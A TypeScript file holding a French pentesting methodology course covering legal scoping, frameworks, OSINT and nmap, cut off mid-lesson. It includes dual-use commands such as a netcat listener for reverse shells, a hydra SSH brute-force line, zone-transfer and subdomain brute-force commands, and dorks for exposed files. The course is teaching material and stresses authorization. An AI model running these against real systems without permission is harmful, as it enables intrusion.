import type { Course } from "./types";
import { h, p, list, code, callout } from "./helpers";

export const PENTESTING_METHODOLOGY_COURSE: Course = {
  id: "pentesting-methodology",
  levelId: 6,
  title: "Pentesting Methodology",
  description:
    "Structurer une démarche de test d'intrusion complète : cadrage, reconnaissance, analyse, exploitation, post-exploitation et reporting.",
  xp: 1500,
  modules: [
    {
      id: "ptm-module-1",
      title: "Le pentest, son cadre et ses référentiels",
      lessons: [
        {
          id: "ptm-lecon-01",
          title: "Qu'est-ce qu'un test d'intrusion ?",
          type: "theory",
          duration: "12 min",
          blocks: [
            h("Des briques à la méthode"),
            p(
              "Jusqu'ici, tu as appris les briques du métier : le système, le terminal, le réseau, l'automatisation, le web et les failles applicatives. Tu sais faire tourner nmap, comprendre une requête HTTP, repérer une injection SQL. Mais lancer des outils dans n'importe quel ordre ne fait pas de toi un pentester. Ce cours transforme ton arsenal en une méthode de travail professionnelle, phase par phase, de la signature du contrat jusqu'au rapport final."
            ),
            h("Un métier, pas une suite d'outils"),
            p(
              "Le pentester est payé pour répondre à une question précise : « en supposant un attaquant, comment et jusqu'où notre système peut-il être compromis ? » Pour répondre, il ne suffit pas de lancer des commandes. Il faut savoir quoi faire, dans quel ordre, avec quelles limites, et comment en tirer un document que le client pourra utiliser."
            ),
            code(
              `nmap -sV 192.168.56.10\nnc -lvnp 4444\nhydra -l admin -P pass.txt ssh://192.168.56.10`
            ),
            h("Le pentest en une phrase"),
            p(
              "Un test d'intrusion (pentest) est une évaluation de la sécurité d'un système, réalisée avec l'autorisation écrite du propriétaire, en simulant les techniques d'un attaquant réel, pour découvrir les failles avant que de vrais attaquants ne les exploitent."
            ),
            h("Pentest, audit, red team : ne pas confondre"),
            list(
              "L'audit de sécurité : on inspecte la configuration et la conformité (réglages, normes), souvent sans attaque active.",
              "Le pentest : on simule des attaques réelles dans un périmètre autorisé, pour prouver qu'une faille est exploitable.",
              "Le red team : une simulation d'attaque complète et réaliste, souvent sans prévenir les défenseurs, pour éprouver la détection.",
              "Le bug bounty : des chasseurs indépendants testent des cibles publiques contre récompense, toujours dans un scope imposé."
            ),
            h("Ce que le pentest n'est pas"),
            list(
              "Une intrusion sans autorisation : sans contrat signé, c'est un délit, pas un test.",
              "Une guerre contre le client : on prouve, on documente, on ne détruit pas.",
              "Un simple lanceur de scanners : l'outil automatique donne des pistes, l'humain confirme et contextualise.",
              "Une garantie de sécurité absolue : un pentest teste un périmètre à un instant donné, rien de plus."
            ),
            h("Les objectifs d'un test d'intrusion"),
            list(
              "Identifier les vulnérabilités réelles et les prouver avec des preuves reproductibles.",
              "Évaluer l'impact : ce qu'un attaquant pourrait réellement obtenir (accès, données, privilèges).",
              "Prioriser les corrections avec un score de gravité partagé (CVSS).",
              "Vérifier que les mesures de protection fonctionnent vraiment.",
              "Rapporter le tout dans un document que la direction et les équipes techniques peuvent utiliser."
            ),
            callout(
              "La méthode est le métier. Un pentest sans méthode, c'est du bricolage dangereux : dangereux pour le client (tu peux casser des systèmes), dangereux pour toi (sans autorisation écrite, tu commets un délit d'intrusion), et inutile (sans rapport, personne ne corrige rien).",
              "info"
            ),
            callout(
              "Règle absolue pour toute la suite du cours : les commandes de scan, d'énumération et d'exploitation ne s'exécutent que sur tes propres machines, ton propre réseau, ou des labos qui t'y autorisent (Kali + VM vulnérables, HackTheBox, TryHackMe). Scanner ou exploiter une cible sans autorisation écrite est un délit (article 323-1 du code pénal).",
              "danger"
            )
          ]
        },
        {
          id: "ptm-lecon-02",
          title: "Boîte noire, boîte grise, boîte blanche",
          type: "theory",
          duration: "11 min",
          blocks: [
            h("Trois niveaux d'information"),
            p(
              "Avant de signer, le client et le pentester s'accordent sur la quantité d'informations que le testeur reçoit sur la cible. Cette information initiale change complètement la nature du test. On parle de boîte noire, boîte grise et boîte blanche, comme pour les tests logiciels."
            ),
            h("La boîte noire"),
            p(
              "Le pentester ne reçoit rien : pas de documentation, pas de compte, pas de schéma réseau. Il part de zéro, comme un attaquant extérieur. C'est le test le plus réaliste, mais aussi le plus long : la reconnaissance prend énormément de temps."
            ),
            list(
              "Avantages : simule fidèlement un attaquant externe, ne suppose rien.",
              "Inconvénients : coûteux, peut manquer des failles que seule la connaissance interne révèle.",
              "Exemple : un engagement qui ne fournit qu'un nom de domaine à tester."
            ),
            h("La boîte blanche"),
            p(
              "Le pentester reçoit tout : code source, schémas d'architecture, comptes, documentation. C'est l'inverse de la boîte noire. On cherche les failles en profondeur, sans perdre de temps en recon. C'est le test qui couvre le plus de surface."
            ),
            list(
              "Avantages : couverture maximale, idéal pour auditer une application ou un code.",
              "Inconvénients : moins réaliste, dépend de la qualité de la documentation fournie.",
              "Exemple : une revue de code source complète ou un test d'une API documentée."
            ),
            h("La boîte grise"),
            p(
              "Le pentester reçoit une information partielle : adresses IP, un compte utilisateur standard, des identifiants applicatifs, mais pas tout. C'est de loin la formule la plus utilisée en entreprise : elle équilibre le réalisme et le coût."
            ),
            list(
              "Avantages : bon rapport temps/couverture, permet de tester des accès internes.",
              "Inconvénients : suppose un niveau d'accès qui ne reflète pas toujours la réalité.",
              "Exemple : tester depuis un poste interne avec un compte utilisateur, sans schéma réseau."
            ),
            h("Et la double vue en red team ?"),
            p(
              "Le red team ajoute une dimension : l'équipe attaquante et l'équipe défensive (blue team) travaillent en parallèle, souvent sans se connaître (purple team quand elles collaborent). La « double vue » désigne le fait que l'attaquant a parfois plus d'informations que le défenseur, ce qui rend la simulation plus exigeante."
            ),
            h("Le tableau récapitulatif"),
            code(
              `Type        Info donnée          Réalisme   Coût     Usage type\nnoire       aucune               ++++       +++      simulateur d'attaquant externe\ngrise       partielle (IP,       ++         ++       le plus courant en entreprise\n            comptes standard)\nblanche     tout (code, docs)    +          +        audit d'applications, code source`
            ),
            h("Ce qu'il faut retenir"),
            list(
              "Le type de boîte se décide au cadrage, avant tout test.",
              "Le rapport doit préciser le type de test réalisé : il change la portée des conclusions.",
              "Une boîte noire qui ne trouve rien ne prouve pas que le système est sûr : elle prouve qu'aucune faille n'a été trouvée dans le temps imparti."
            ),
            callout(
              "Quelle que soit la boîte, l'autorisation écrite reste identique. Le type de test influence la méthode, jamais le cadre légal.",
              "info"
            ),
            callout(
              "N'utilise jamais les identifiants ou le schéma d'une cible réelle hors du cadre signé. Une information « en boîte blanche » ne donne aucun droit : elle reste protégée par le contrat de confidentialité.",
              "danger"
            )
          ]
        },
        {
          id: "ptm-lecon-03",
          title: "Le cadre légal : autorisation, contrat et Rules of Engagement",
          type: "theory",
          duration: "13 min",
          blocks: [
            h("La phase qui précède tout"),
            p(
              "Avant la moindre commande, il y a le pre-engagement : définir quoi tester, où, comment, quand, avec quelles limites et, surtout, avec quelle autorisation. Cette phase produit le contrat, les règles d'engagement (Rules of Engagement, RoE) et l'autorisation écrite signée par le client."
            ),
            h("Pourquoi c'est la phase la plus importante"),
            p(
              "C'est la différence entre un pentest et un délit. En France comme dans la plupart des juridictions, se connecter à un système sans autorisation est une intrusion punissable (article 323-1 du code pénal : jusqu'à deux ans d'emprisonnement et 60 000 euros d'amende, davantage avec circonstances aggravantes). L'autorisation écrite est ta protection juridique. Elle protège aussi le client : sans cadre, tu pourrais faire tomber un serveur de production ou lire des données personnelles (RGPD)."
            ),
            h("L'analogie du permis de conduire"),
            p(
              "Le pre-engagement, c'est le permis de conduire avant la course. Tu ne montes pas dans une voiture qui ne t'appartient pas sans un accord écrit du propriétaire, un trajet convenu et des limites de vitesse. Lancer nmap sur le réseau d'un client sans contrat, c'est conduire la voiture du voisin sans clé ni permis."
            ),
            h("Les documents de l'engagement"),
            list(
              "Le contrat de prestation : mission, durée, livrables, conditions financières, confidentialité.",
              "Les règles d'engagement (RoE) : le détail technique de ce qui est autorisé ou interdit.",
              "L'autorisation écrite : document nominatif qui autorise expressément les tests sur les actifs listés, pour une période donnée.",
              "Le NDA (accord de confidentialité) : souvent intégré au contrat, il protège les informations vues pendant le test."
            ),
            h("Le contenu des règles d'engagement"),
            code(
              `ROE — Engagement \"exemple.fr\"\n\nScope :\n  - 192.168.1.10, 192.168.1.11 (DMZ)\n  - www.exemple.fr, api.exemple.fr\nHoraires : 9h-18h, lundi à vendredi\nTechniques autorisées :\n  - scans, énumération, exploitation de failles\n  - bruteforce SSH limité à 3 essais/compte/minute\nInterdictions :\n  - exfiltrer des données réelles\n  - exploits destructeurs\n  - pivot vers le réseau de production sans accord écrit\nContact d'urgence : DSI (jour) / garde technique (nuit)\nPériode : du 01/03 au 15/03`
            ),
            h("Le scope : la frontière à ne pas franchir"),
            p(
              "Le scope liste précisément les actifs autorisés. Un sous-domaine découvert en cours de route et absent du scope ne se teste pas : on le documente et on demande une extension écrite si la piste vaut le coup. Le dérapage de scope est une faute professionnelle grave, et souvent un délit."
            ),
            h("Le déroulement du cadrage"),
            list(
              "Réunion de cadrage : comprendre l'entreprise, ses objectifs, ses craintes (conformité, assurance, doute sur une faille précise).",
              "Définition du scope : IP, domaines, applications, plages horaires, environnements.",
              "Définition des règles d'engagement : techniques autorisées, interdictions, contacts d'urgence.",
              "Signature du contrat et des RoE.",
              "Rédaction de l'autorisation écrite, puis cadrage du rapport (à qui s'adresse-t-il ?)."
            ),
            callout(
              "Les bons pentesters ont un modèle d'autorisation et un modèle de RoE prêts à remplir. Le pre-engagement ne nécessite aucun outil offensif, mais une rigueur totale : ce n'est pas une formalité, c'est le cœur légal du métier.",
              "tip"
            ),
            callout(
              "Ne jamais commencer un test sans autorisation écrite. « Le client m'a dit par téléphone » ne protège pas devant la loi : seul un document signé, avec un périmètre précis, fait foi.",
              "danger"
            )
          ]
        },
        {
          id: "ptm-lecon-04",
          title: "Les référentiels : PTES, OWASP, OSSTMM",
          type: "theory",
          duration: "12 min",
          blocks: [
            h("Trois boussoles, une même route"),
            p(
              "Les référentiels sont des documents publics qui décrivent comment mener un test de sécurité : quelles phases suivre, quoi tester, comment rapporter. Un pentester professionnel cite ceux qu'il utilise dans son rapport, pour que la méthodologie soit vérifiable par le client, l'assureur ou un auditeur."
            ),
            h("PTES : Penetration Testing Execution Standard"),
            p(
              "C'est le standard le plus cité pour la démarche générale d'un test d'intrusion. Il découpe l'engagement en sept phases, que l'on retrouve tout au long de ce cours."
            ),
            list(
              "Pre-engagement : contrat, scope, règles d'engagement, autorisation.",
              "Intelligence Gathering : la reconnaissance, passive puis active.",
              "Threat Modeling : comprendre ce qui a de la valeur et comment le cibler.",
              "Vulnerability Analysis : identifier et noter les failles.",
              "Exploitation : obtenir un accès réel (POC).",
              "Post-Exploitation : escalade de privilèges, données, pivot.",
              "Reporting : le rapport exécutif et le rapport technique."
            ),
            h("OSSTMM : Open Source Security Testing Methodology Manual"),
            p(
              "Publié par l'ISECOM, il est plus analytique que PTES. Il découpe la sécurité en canaux d'attaque (humain, physique, sans fil, télécommunications, données) et propose des mesures quantifiables, comme la réduction de la surface d'attaque. Il est apprécié pour sa rigueur scientifique."
            ),
            h("OWASP : Open Web Application Security Project"),
            p(
              "C'est la référence pour le test des applications web. Tu connais déjà le Top 10 (niveau 5) qui classe les familles de failles. Pour la méthodologie, l'OWASP publie aussi le WSTG (Web Security Testing Guide) : un guide pratique qui détaille, pour chaque famille de faille, comment tester et quoi vérifier."
            ),
            h("Et aussi..."),
            list(
              "ISSAF : Information Systems Security Assessment Framework, cadre européen d'évaluation.",
              "NIST SP 800-115 : guide technique américain de test et d'évaluation de la sécurité.",
              "Les guides spécifiques : PTES et OSSTMM pour la démarche, WSTG pour le web, OWASP Top 10 pour le classement."
            ),
            h("Pourquoi les connaître"),
            p(
              "Les recruteurs et les certifications (OSCP, CEH) évaluent la méthode, pas seulement les outils. Un rapport qui cite PTES et explique le cadrage inspire confiance ; un rapport qui liste des commandes sans méthodologie est un rapport inutilisable."
            ),
            h("Ce qu'il faut retenir"),
            list(
              "PTES structure l'engagement en sept phases, de la signature à la restitution.",
              "OSSTMM apporte la rigueur analytique et les canaux d'attaque.",
              "OWASP structure l'analyse des applications web (WSTG, Top 10).",
              "Le rapport doit citer les référentiels utilisés."
            ),
            callout(
              "Tu n'as pas besoin de connaître les standards par cœur : il faut savoir qu'ils existent, ce qu'ils couvrent, et où les retrouver. La méthode de ce cours suit la trame PTES, avec les outils d'OWASP pour le web.",
              "info"
            ),
            callout(
              "Un référentiel ne donne jamais d'autorisation. Le PTES décrit comment tester, pas à qui tu as le droit de tester : le cadre légal du pre-engagement reste toujours obligatoire.",
              "warning"
            )
          ]
        },
        {
          id: "ptm-lecon-05",
          title: "Le vocabulaire du métier : vulnérabilité, exploit, CVE, CWE, CVSS, risque",
          type: "theory",
          duration: "12 min",
          blocks: [
            h("Les mots qui structurent le rapport"),
            p(
              "Avant d'écrire un rapport, il faut parler la même langue que le client, l'assureur et les équipes techniques. Six termes reviennent dans chaque rapport de pentest. Les comprendre précisément évite les malentendus qui ruinent un engagement."
            ),
            h("La vulnérabilité"),
            p(
              "Une vulnérabilité est un défaut, une faiblesse ou une erreur de configuration dans un système, qui peut être exploitée. Exemple : un service FTP obsolète qui possède un backdoor connu. La vulnérabilité existe même si personne ne l'exploite."
            ),
            h("L'exploit"),
            p(
              "Un exploit est un morceau de code, une commande ou une technique qui tire parti d'une vulnérabilité pour obtenir un effet (exécuter du code, lire un fichier, obtenir un accès). L'exploit est l'outil ; la vulnérabilité est la faiblesse qu'il cible."
            ),
            h("La CVE"),
            p(
              "CVE (Common Vulnerabilities and Exposures) est la base mondiale des vulnérabilités identifiées. Chaque vulnérabilité publiquement connue reçoit un identifiant unique : CVE-année-numéro. C'est le langage commun pour désigner une faille précise."
            ),
            code(
              `CVE-2011-2523  → backdoor vsftpd 2.3.4\nCVE-2022-0847  → Dirty Pipe (noyau Linux)\nCVE-2016-5195  → Dirty COW (noyau Linux)`
            ),
            h("La CWE"),
            p(
              "CWE (Common Weakness Enumeration) classe le type de faiblesse, indépendamment du logiciel précis. Exemples : CWE-79 (XSS), CWE-89 (injection SQL), CWE-798 (mots de passe codés en dur). La CVE nomme une faille précise, la CWE classe la famille de défaut."
            ),
            h("Le CVSS"),
            p(
              "CVSS (Common Vulnerability Scoring System) est l'échelle normalisée de 0 à 10 qui note la gravité technique d'une vulnérabilité. On le détaille dans une leçon dédiée, mais retiens déjà que « critique », « élevé » etc. sont des bornes précises, pas des impressions."
            ),
            h("Le risque"),
            p(
              "Le risque n'est pas la vulnérabilité : c'est la combinaison de la probabilité qu'une menace se réalise et de l'impact sur l'entreprise. Une faille critique sur un serveur de test isolé est un risque faible ; la même faille sur le site de production exposé à Internet est un risque majeur."
            ),
            h("La chaîne complète"),
            code(
              `Menace + Vulnérabilité + Exploit accessible  →  Impact\n\nExemple :\nattaquant sur Internet (menace)\n+ vsftpd 2.3.4 vulnérable (vulnérabilité, CVE-2011-2523)\n+ exploit disponible, port ouvert (exploit accessible)\n= shell root sur le serveur (impact)`
            ),
            h("Le glossaire express"),
            list(
              "Vulnérabilité : la faiblesse. Exploit : l'arme qui l'utilise.",
              "CVE : l'identité d'une faille connue. CWE : la famille de défaut.",
              "CVSS : la note de gravité (0 à 10).",
              "Risque : la vulnérabilité replacée dans le contexte de l'entreprise."
            ),
            callout(
              "Dans un rapport, chaque constat lie les quatre : la CVE, la CWE, le score CVSS et l'impact sur le risque métier. C'est cette chaîne qui rend le rapport exploitable.",
              "tip"
            ),
            callout(
              "Une vulnérabilité qui n'a pas de CVE n'est pas forcément innocente : les failles inédites (zero-day) n'ont pas encore d'identifiant. Et un score CVSS élevé ne prouve pas qu'une faille est exploitable dans ton contexte : il faut toujours confirmer.",
              "warning"
            )
          ]
        },
        {
          id: "ptm-lecon-06",
          title: "Le déroulé en 7 phases d'un pentest",
          type: "theory",
          duration: "13 min",
          blocks: [
            h("La carte de route"),
            p(
              "Chaque engagement suit la même trame, celle du PTES. La connaître par cœur te permet de savoir à chaque instant où tu en es, ce qui doit être produit, et ce qui manque. C'est aussi la trame de ce cours : chaque module correspond à une partie du chemin."
            ),
            code(
              `1. Pre-engagement     → contrat, scope, RoE, autorisation écrite\n2. Intelligence        → carte de la cible (recon passive puis active)\n3. Threat Modeling     → ce qui a de la valeur, cibles priorisées\n4. Vulnerability       → CVE identifiées, scores CVSS\n5. Exploitation        → POC, premier accès\n6. Post-Exploitation   → privesc, données, mouvement latéral\n7. Reporting           → rapport exécutif + technique, re-test`
            ),
            h("Phase 1 : Pre-engagement"),
            p(
              "On définit quoi, où, comment, quand, avec quelle autorisation. Les livrables sont le contrat, les RoE et l'autorisation écrite. Aucune commande technique avant cette phase."
            ),
            h("Phase 2 : Intelligence Gathering"),
            p(
              "On dresse la carte de la cible. En passif (OSINT : whois, DNS, Google dorks, archives) on observe sans toucher ; en actif (nmap, énumération) on interroge les services. Le livrable est l'inventaire des actifs."
            ),
            h("Phase 3 : Threat Modeling"),
            p(
              "On réfléchit à ce qui vaut la peine : quelles données sont sensibles, quels services exposés, quel chemin un attaquant prendrait. Le livrable est une liste de cibles priorisées. Cette phase est souvent rapide en pentest classique, plus lourde en red team."
            ),
            h("Phase 4 : Vulnerability Analysis"),
            p(
              "On croise les services et versions avec les vulnérabilités connues (CVE), on confirme à la main et on note la gravité (CVSS). Le livrable est une liste de candidats à l'exploitation, scorés et priorisés."
            ),
            h("Phase 5 : Exploitation"),
            p(
              "On prouve qu'une vulnérabilité est réellement exploitable en obtenant un accès minimal et documenté : un shell, une session, un fichier lu. Le livrable est un POC reproductible, avec captures."
            ),
            h("Phase 6 : Post-Exploitation"),
            p(
              "On montre l'impact maximal : escalade de privilèges, lecture de fichiers sensibles, éventuel mouvement latéral, dans les limites du scope. On nettoie ensuite ce qu'on a déposé."
            ),
            h("Phase 7 : Reporting"),
            p(
              "On remet le rapport : synthèse exécutive pour la direction, rapport technique pour les équipes, avec preuves, scores et recommandations. Le re-test valide les corrections."
            ),
            h("Ce qu'il faut retenir"),
            list(
              "Les sept phases s'enchaînent dans l'ordre : on ne saute pas d'étape.",
              "Chaque phase produit un livrable : les livrables font le rapport.",
              "Le modèle du cours : Module 1 (cadre et référentiels), Module 2 (recon), Module 3 (analyse, exploitation, post-exploitation), Module 4 (méthodologie complète et rapport), Module 5 (pratique et bilan)."
            ),
            callout(
              "Le réflexe « où suis-je ? » : avant chaque commande, demande-toi dans quelle phase tu es et quel livrable elle alimente. C'est le réflexe qui différencie l'amateur du professionnel.",
              "tip"
            ),
            callout(
              "Ces sept phases se déroulent sur des machines autorisées. Sur une cible réelle sans contrat, la phase 1 (et donc tout le reste) est un délit : rappelle-toi l'article 323-1 du code pénal.",
              "danger"
            )
          ]
        },
      ],
    },
    {
      id: "ptm-module-2",
      title: "Reconnaissance : passive, active et énumération",
      lessons: [
        {
          id: "ptm-lecon-07",
          title: "Reconnaissance passive : OSINT",
          type: "exercise",
          duration: "14 min",
          blocks: [
            h("Regarder sans toucher"),
            p(
              "La reconnaissance passive, c'est observer la cible sans lui envoyer un seul paquet. On consulte des sources publiques : registres de domaines, serveurs DNS, archives web, moteurs de recherche, certificats. C'est la première phase de l'intelligence gathering, et elle est indétectable."
            ),
            h("L'analogie du cambrioleur"),
            p(
              "Un cambrioleur expérimenté passe plus de temps à observer qu'à crocheter : il repère les caméras, les horaires, la porte d'entrée, les voisins. La recon passive, c'est pareil : tu établis la carte avant de choisir par quelle fenêtre entrer."
            ),
            h("Pourquoi commencer par le passif"),
            list(
              "Indétectable : aucun trafic ne part vers la cible, aucun log.",
              "Gratuit : les sources sont publiques.",
              "Économise le temps de la recon active : on sait déjà quoi chercher.",
              "Obligatoire en red team : l'attaquant réel commence toujours par là."
            ),
            h("Les grandes sources OSINT"),
            list(
              "whois : qui possède le domaine, quels serveurs de noms.",
              "DNS public : adresses IP, enregistrements MX (mail), TXT, NS.",
              "crt.sh : les certificats TLS publiés, qui révèlent des sous-domaines.",
              "Moteurs de recherche et leurs opérateurs (les dorks, leçon suivante).",
              "Archives web (Wayback Machine) : anciennes versions de pages, fichiers disparus.",
              "Shodan / Censys : moteurs d'actifs exposés sur Internet.",
              "Réseaux sociaux et LinkedIn : noms de collaborateurs, e-mails, rôles."
            ),
            h("L'outillage de base"),
            p(
              "Quatre commandes couvrent 80 % de la recon DNS d'un domaine. Elles s'exécutent sur ton poste, sans jamais toucher la cible elle-même."
            ),
            code(
              `whois exemple.fr\ndig exemple.fr MX\ndig exemple.fr NS\ndig exemple.fr TXT`
            ),
            h("crt.sh : les certificats racontent tout"),
            p(
              "Chaque certificat TLS publié pour un domaine est enregistré publiquement. En interrogeant crt.sh, tu retrouves les sous-domaines réels, y compris ceux que personne ne veut voir."
            ),
            code(
              `curl -s "https://crt.sh/?q=%25.exemple.fr&output=json" -o crt.json\npython3 -c 'import json; data=json.load(open("crt.json")); print("\\n".join(sorted(set(d["name_value"] for d in data))))'`
            ),
            h("Les livrables de la phase"),
            list(
              "L'inventaire des actifs : domaines, IP, sous-domaines.",
              "Les fiches techniques : versions de logiciels repérées, services de mail.",
              "Une wordlist ciblée : noms probables d'utilisateurs pour la suite.",
              "Chaque découverte avec sa source : URL, date, capture."
            ),
            callout(
              "Note chaque découverte avec sa source et sa date : c'est de la matière pour le rapport. Une recon qui ne note rien ne sert à rien.",
              "tip"
            ),
            callout(
              "La recon passive est légale sur les données publiques, mais ce que tu découvres peut être sensible. Ne pas exploiter ce que la recon révèle hors du périmètre autorisé, et ne pas diffuser les informations collectées.",
              "danger"
            )
          ]
        },
        {
          id: "ptm-lecon-08",
          title: "Google dorks et sources OSINT avancées",
          type: "theory",
          duration: "12 min",
          blocks: [
            h("Le moteur de recherche comme outil"),
            p(
              "Un moteur de recherche indexe des milliards de pages. Les opérateurs de recherche (les « dorks ») permettent de filtrer cette indexation pour retrouver des fichiers exposés, des pages d'administration, des erreurs, des informations oubliées. C'est un outil d'OSINT majeur, entièrement passif."
            ),
            h("Les opérateurs de base"),
            code(
              `site:exemple.fr        → pages du domaine uniquement\ninurl:admin             → URLs contenant "admin"\nintitle:"index of"      → pages de listing de répertoires\nfiletype:sql            → fichiers SQL indexés\nintext:motdepasse       → pages contenant le mot`
            ),
            h("Les dorks classiques du pentester"),
            list(
              "site:exemple.fr filetype:sql : fichiers de base de données indexés.",
              "site:exemple.fr inurl:wp-admin : interface WordPress non protégée.",
              "intitle:\"index of\" + nom du site : répertoires ouverts en navigation.",
              "site:exemple.fr ext:bak ou ext:old : fichiers de sauvegarde oubliés.",
              "site:exemple.fr \"mot de passe\" : pages contenant des secrets."
            ),
            h("Combiner les opérateurs"),
            p(
              "Les opérateurs se combinent pour affiner la recherche. On commence large pour mesurer la surface, puis on resserre avec le nom de l'entreprise, les technologies connues et les types de fichiers sensibles."
            ),
            code(
              `site:exemple.fr filetype:sql OR filetype:bak\nsite:exemple.fr (inurl:admin OR inurl:backup)\nintitle:"index of" "exemple.fr"`
            ),
            h("Les archives : la Wayback Machine"),
            p(
              "L'archive du web conserve d'anciennes versions des pages. Une page supprimée, un ancien formulaire, une ancienne version d'une application : tout peut y traîner encore, et révéler des technologies ou des informations aujourd'hui cachées."
            ),
            code(
              `curl -s "http://archive.org/wayback/available?url=exemple.fr/admin"`
            ),
            h("Shodan et Censys : la recon du monde entier"),
            p(
              "Shodan et Censys indexent les services exposés sur Internet : un moteur de recherche, non des pages, mais des ports et des bannières. En cherchant ton domaine ou tes plages IP, tu retrouves les services réellement accessibles, leurs versions, et parfois des vulnérabilités associées."
            ),
            h("theHarvester : e-mails, noms, hôtes"),
            p(
              "theHarvester croise plusieurs sources (moteurs, DNS) pour collecter les e-mails, les noms et les hôtes associés à un domaine. Les e-mails servent à construire des wordlists de noms d'utilisateurs pour la suite de l'engagement."
            ),
            code(
              `theHarvester -d exemple.fr -b google\ntheHarvester -d exemple.fr -b crtsh`
            ),
            h("Les bons réflexes"),
            list(
              "Tout est documenté : moteur, requête exacte, résultat, date.",
              "Les dorks révèlent des fichiers sensibles : on note leur existence, on ne les télécharge pas.",
              "Croiser les sources : un sous-domaine trouvé dans crt.sh et dans Shodan est plus fiable.",
              "Restreindre à l'éthique : les recherches restent dans le périmètre du contrat."
            ),
            callout(
              "Le volume d'informations est vite écrasant. Un fichier de notes daté et structuré (actifs, sources, dates) est le seul moyen de rendre cette phase utilisable.",
              "tip"
            ),
            callout(
              "Un dork peut révéler des données personnelles ou des fichiers de clients. Ne jamais télécharger, modifier ou diffuser ce que la recherche expose : tu documentes, tu ne collectes pas des données de tiers.",
              "warning"
            )
          ]
        },
        {
          id: "ptm-lecon-09",
          title: "whois, DNS et sous-domaines",
          type: "exercise",
          duration: "13 min",
          blocks: [
            h("L'état civil d'un domaine"),
            p(
              "whois répond à la question « à qui appartient ce domaine ? ». Il renvoie le bureau d'enregistrement, les serveurs de noms, les dates de création et d'expiration, parfois le contact administratif. Depuis le RGPD, les contacts personnels sont masqués, mais les serveurs de noms restent une mine d'or."
            ),
            code(
              `whois exemple.fr`
            ),
            h("Le DNS : le bottin de la cible"),
            p(
              "Le DNS traduit les noms en adresses. Chaque type d'enregistrement raconte quelque chose : A donne l'IP, MX les serveurs de mail, NS les serveurs de noms, TXT les configurations (dont les validations), CNAME les alias vers d'autres services."
            ),
            code(
              `dig exemple.fr A\ndig exemple.fr MX\ndig exemple.fr NS\ndig exemple.fr TXT\nhost exemple.fr`
            ),
            h("Le transfert de zone"),
            p(
              "Un serveur DNS mal configuré peut autoriser un transfert de zone : une copie complète de tous les enregistrements du domaine. C'est l'équivalent d'obtenir le bottin complet de l'entreprise. Rare aujourd'hui, mais à tester sur chaque NS : c'est un constat classique."
            ),
            code(
              `dig @ns1.exemple.fr exemple.fr AXFR`
            ),
            h("Énumérer les sous-domaines"),
            p(
              "Les sous-domaines sont des portes souvent moins protégées que la vitrine principale. Deux approches : les sources passives (crt.sh, vu à la leçon 7) et la force brute de noms candidats contre le DNS."
            ),
            code(
              `gobuster dns -d exemple.fr -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
            ),
            h("Interpréter ce qu'on trouve"),
            list(
              "Un sous-domaine oublié (test., dev., admin.) = une application sans protection.",
              "Un MX vers un ancien serveur = une version obsolète en service.",
              "Un enregistrement TXT qui révèle un prestataire = une surface d'attaque externe.",
              "Une IP dans une plage cloud = des règles d'hébergement à vérifier au contrat."
            ),
            h("Ce qu'on note dans le rapport"),
            list(
              "Les enregistrements DNS significatifs, avec le type et la valeur.",
              "Les sous-domaines découverts, avec la source de la découverte.",
              "Les transferts de zone autorisés (constat à part entière).",
              "Toute découverte hors scope, documentée sans être exploitée."
            ),
            callout(
              "Les wordlists se trouvent sur Kali sous /usr/share/wordlists/ (seclists, dirb...). Adapte la longueur à ton temps : une liste courte pour la vitesse, une longue pour la complétude.",
              "tip"
            ),
            callout(
              "L'énumération DNS par force brute génère du trafic vers les serveurs de noms. En labo, c'est sans risque ; chez un client, vérifie que la technique est autorisée dans les RoE avant de lancer.",
              "danger"
            )
          ]
        },
        {
          id: "ptm-lecon-10",
          title: "Reconnaissance active : nmap en profondeur",
          type: "exercise",
          duration: "16 min",
          blocks: [
            h("L'outil de référence"),
            p(
              "nmap est le couteau suisse de la reconnaissance active : découverte d'hôtes, scan de ports, détection de services et de versions, détection d'OS, scripts d'énumération et de vulnérabilités. On l'utilise en cinq temps méthodiques."
            ),
            code(
              `1. DÉCOUVERTE    sudo nmap -sn 192.168.56.0/24\n2. PORTS (large) sudo nmap -Pn -sS -p- --min-rate 1000 IP\n3. SERVICES      sudo nmap -Pn -sV -p <ports_ouverts> IP\n4. OS            sudo nmap -Pn -O IP\n5. SCRIPTS       sudo nmap -Pn -sC -p <ports> IP\n                 sudo nmap --script vuln -p <ports> IP`
            ),
            h("1. La découverte des hôtes"),
            p(
              "Avant de scanner des ports, on trouve qui est vivant sur le périmètre. Le ping sweep envoie des sondes ARP/ICMP/TCP et liste les machines qui répondent."
            ),
            code(
              `sudo nmap -sn 192.168.56.0/24`
            ),
            h("2. Le scan de ports complet"),
            p(
              "Ensuite on scanne tous les ports TCP de chaque hôte. L'option -p- teste les 65 535 ports, pas seulement les 1000 plus courants. Un service sur un port atypique est souvent la faille préférée des attaquants."
            ),
            code(
              `sudo nmap -Pn -sS -p- --min-rate 1000 192.168.56.10 -oA scan-all`
            ),
            h("3. La détection de services"),
            p(
              "Un port ouvert sans version identifiée, c'est un indice sans suspect. -sV interroge les services pour récupérer produit et version. On ne le lance que sur les ports ouverts : c'est plus lent, donc on le cible."
            ),
            code(
              `sudo nmap -Pn -sV -p 21,22,80,445 192.168.56.10 -oA scan-services`
            ),
            h("4. Le système d'exploitation"),
            p(
              "L'option -O tente de deviner le système d'exploitation à partir des réponses TCP/IP. Utile pour orienter la recherche d'exploits (un noyau Linux précis, un Windows ancien...). Elle nécessite root et peut être longuement décalée par un pare-feu."
            ),
            code(
              `sudo nmap -Pn -O 192.168.56.10`
            ),
            h("5. Les scripts"),
            p(
              "-sC lance les scripts d'énumération par défaut (bannières, configs, utilisateurs). --script vuln croise les versions avec des vulnérabilités connues. C'est la transition entre recon et analyse."
            ),
            code(
              `sudo nmap -Pn -sC -p 21,22,80,445 192.168.56.10\nsudo nmap --script vuln -p 21,22,80,445 192.168.56.10`
            ),
            h("Toujours sauvegarder"),
            p(
              "L'option -oA sauvegarde le scan en trois formats (normal, greppable, XML). Sans sauvegarde, pas de preuve, pas de rapport. Pour extraire les ports ouverts :"
            ),
            code(
              `grep -E "open" scan-all.gnmap`
            ),
            h("Un résultat attendu"),
            code(
